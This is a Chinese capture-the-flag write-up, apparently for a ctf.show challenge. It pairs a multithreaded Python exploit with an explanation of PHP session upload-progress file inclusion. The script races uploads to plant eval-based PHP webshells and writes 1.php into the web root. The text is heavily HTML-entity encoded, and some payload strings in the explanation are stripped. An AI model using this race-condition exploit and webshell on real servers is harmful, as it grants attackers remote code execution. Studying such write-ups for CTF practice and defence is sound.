import requestsimport ioimport threadingurl = &#x27;http://9036917c-b5b5-448b-a764-2fc9636b9025.challenge.ctf.show/&#x27;sessionid = &#x27;ctfshow&#x27;data = &#123;    &quot;1&quot;:&quot;file_put_contents(&#x27;/var/www/html/1.php&#x27;,&#x27;&lt;?php eval($_POST[2]);?&gt;&#x27;);&quot;&#125;def write(session):    fileBytes = io.BytesIO(b&#x27;a&#x27;*1024*50)    while True:        respose = requests.post(url,data=&#123;                &#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;:&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;,    &#125;,                cookies = &#123;                    &#x27;PHPSESSID&#x27;: sessionid    &#125;,                files = &#123;            &#x27;file&#x27;: (&#x27;ctfshow.jpg&#x27;, fileBytes),    &#125;,    )def read(session):    while True:        respose = session.post(url+&#x27;?file=/tmp/sess_&#x27;+sessionid,data=data,            cookies = &#123;                &#x27;PHPSESSID&#x27;: sessionid            &#125;)        respose2 = session.get(url+&#x27;1.php&#x27;)        if respose2.status_code == 200:            print(&#x27;++++++done++++++&#x27;)        else:            print(respose2.status_code)if __name__ == &#x27;__main__&#x27;:    evnet = threading.Event()    with requests.session() as session:        for i in range(5):            threading.Thread(target=read, args=(session,)).start()        for i in range(5):            threading.Thread(target=write, args=(session,)).start()    evnet.set()

session漏洞利用PHP Session是用于存储用户会话数据，但这是临时文件，请求结束就会被立即删除，默认路径&#x2F;tmp&#x2F;sess_xxx。
用户访问网站    ↓服务器创建 session 文件：/tmp/sess_abc123    ↓文件内容：username|s:5:&quot;admin&quot;;role|s:5:&quot;admin&quot;;    ↓返回 cookie：PHPSESSID=abc123    ↓用户下次请求带上 cookie，服务器读取对应session文件

在这个过程中有一个可控的参数叫PHP_SESSION_UPLOAD_PROGRESS
; php.ini 配置session.upload_progress.enabled = On  ; 默认开启session.upload_progress.name = &quot;PHP_SESSION_UPLOAD_PROGRESS&quot;

例如当上传文件时，PHP会自动把上传进度写入session：
POST 请求：- PHPSESSID=ctfshow- PHP_SESSION_UPLOAD_PROGRESS=&lt;?php phpinfo();?&gt;- file=上传的文件结果 → /tmp/sess_ctfshow 内容：&lt;?php phpinfo();?&gt;|a:1:&#123;s:12:&quot;upload_progress&quot;;...&#125;

可见这样就可以在session文件中写入木马，但又因为这是临时文件，写入之后会被删除，无法访问，所以在脚本中开了多个线程不断的进行写入和读取
- write线程：持续写入，保持session文件存在- read线程：疯狂尝试包含执行

在脚本中write方法中**’PHP_SESSION_UPLOAD_PROGRESS’:’‘这是写入session文件的木马，在read方法中session建立会话发送post请求并保持cookies不变因为这样才能访问到session文件，cookies &#x3D; {‘PHPSESSID’: sessionid}，post请求体是data &#x3D; { “1”:”file_put_contents(‘&#x2F;var&#x2F;www&#x2F;html&#x2F;1.php’,’‘);”}，而url为?file&#x3D;&#x2F;tmp&#x2F;sess_’+sessionid**这一步就是把session文件包含进来，这样第一句木马才能写入，再写入第二句木马
